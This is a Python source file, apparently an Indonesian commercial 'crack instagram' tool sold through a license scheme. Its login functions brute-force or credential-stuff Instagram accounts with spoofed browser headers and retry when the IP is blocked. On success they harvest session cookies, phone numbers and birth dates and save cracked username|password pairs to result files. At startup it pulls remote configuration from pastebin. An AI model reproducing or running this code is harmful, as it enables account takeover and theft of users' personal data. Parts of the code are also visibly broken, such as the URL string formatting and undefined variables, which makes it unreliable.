				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "dnt": "1",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				param = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Cache-Control": "max-age=0",
				      "Upgrade-Insecure-Requests": "1",
				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": f"https://www.secure.instagram.com/"+user+"/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				dateku = str(random.choice([param, head2]))
				respon=ses.post("https://www.secure.instagram.com/accounts/login/ajax/",headers = head, data = data, allow_redirects = dateku)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfoocu(cookie)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
					tree.add(f"{P2}followers : {H2}{pengikut}")
					tree.add(f"{P2}following : {H2}{mengikut}")
					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
					tree.add(f"{P2}postingan : {H2}{postingan}")
					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(f"{P2}nama akun : {K2}{nama}")
					tree.add(f"{P2}username  : {K2}{user}")
					tree.add(f"{P2}password  : {K2}{pw}")
					tree.add(f"{P2}followers : {K2}{pengikut}")
					tree.add(f"{P2}following : {K2}{mengikut}")
					tree.add(f"{P2}postingan : {K2}{postingan}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f'\r[deep_white][red] spam ip {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
					prog.advance(des)
					time.sleep(10)
					self.crackAJAX(user,pas)

				else:
					continue
			loop+=1
		except:
			self.crackAJAX(user,pas)
	
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			xyaaXD = random.randint(1000000000, 99999999999)
			ses = requests.Session()
			ts = calendar.timegm(current_GMT)
			#sys.stdout.write(f'\r{P}[{H}#{P}] {H}cheking {N}{usr}{P}');sys.stdout.flush()
			response = ses.get(f"https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en").text
			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
			head = {
                    'Host': 'z-p42.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '296',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.108 Mobile Safari/537.36 Instagram 54.0.0.14.82 Android (22/5.1; 480dpi; 1080x1920; Meizu; m3 note; m3note; mt6755; uk_UA; 117539703)',
                    'Origin': 'https://z-p42.www.instagram.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'X-Requested-With': 'mark.via.gp',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
			param={
					'csrfmiddlewaretoken': token,
					'username': usr,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}'
					}
			respon=ses.post("https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en", headers = head, data = param, allow_redirects=True)
			if "userId" in str(respon.text) or "sessionid" in ses.cookies.get_dict():
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
				nomor, tanggal = self.ingfoocu(cookie)
				tree = Tree("")
				tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{usr}|{pwd}")
				tree.add(f"{P2}followers : {H2}{pengikut}")
				tree.add(f"{P2}following : {H2}{mengikut}")
				tree.add(f"{P2}nomor hp  : {H2}{nomor}")
				tree.add(f"{P2}postingan : {H2}{postingan}")
				tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
				prints(tree)
				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print("CP")
				print(f"{K}{usr} {P}| {K}{pwd}{P}\n")
				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'ip_block' in str(respon.text):
				sys.stdout.write(f'\r {P}[{M}#{P}] {M}spamIP {N}{len(usr)}{P}');sys.stdout.flush()
				time.sleep(5)
				self.checkAPI(usr, pwd)
		except:
			self.checkAPI(usr,pwd)

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

###----------[ MASUK LISENSI ]---------- ###
def key():
	os.system("clear") 
	banner()
	prints(Panel(f"{P2}Silahkan Masukan Lisensi Tools Agar Bisa Masuk Ke Tools Insta TianXD\nJika Anda Belum Mempunyai Lisensi Ketik {H2}Beli {P2}Untuk Melihat Harga Lisensi",style=f"green"))
	key = input(f"{P}[{B}?{P}] Masukan Lisensi : {H}")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server Insta Garam XD",width=80,padding=(0,6),style=f"green"));time.sleep(3); __cek__().cekCOK()
	except KeyError:
		prints(Panel(f"{P2} Lisensi Yang Anda Masukan Tdak Terdaftar Silahkan Beli Terlebih Dahulu",width=80,padding=(0,1),style=f"green"));os.system("xdg-open https://wa.me/+6283873281920?text=hallo+bang+mau+beli+lisensi+crack+instagram");time.sleep(2);exit()
		
###----------[ CEK LISENSI ]---------- ###				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io"%(x)).json()['licenseKey']['key']; __cek__().cekCOK()
	except KeyError:
		prints(Panel(f"{P2}Lisensi Kamu Sudah Kadaluwarsa Silahkan Beli Lisensi Ke TianXD",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6283873281920?text=halo+bang+mau+beli+lisensi+crack+instagram");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    prints(Panel(f"{P2}[{H2}01{P2}]. 1 Minggu {H2}20.000 {P2}Max Pemakaian 1 Device\n{P2}[{H2}02{P2}]. 1 Bulan {H2}80.000{P2} Max Pemakaian 5 Device\n{P2}[{H2}03{P2}]. Open Source Full Update {H2}350.000",width=80,padding=(0,15),style=f"green"))
    zxc = input(f"{P}[{B}?{P}] Pilih Lisensi : {H}")
    if zxc in [""]:print(f"{P}[{M}!{P}] Pilih Yang Bener Kontol");time.sleep(3);exit()
    elif zxc in ["1","01"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283873281920?text=halo+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283873281920?text=halo+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283873281920?text=halo+bang+mau+beli+lisensi+full+source");time.sleep(2);exit()
    else:print(f"{P}[{M}!{P}] Ngetik Apaan Sih Kontol?!");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()


if __name__=='__main__':
	lisensiku.append("sukses")
	try:
	    with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/0cWckNrU').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/9GybVKaq').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         __cek__().cekCOK()
	except requests.exceptions.ConnectionError:
		print(f'{P}[{M}!{P}] Koneksi Internet Anda Bermasalah')
		time.sleep(0.03)
		exit()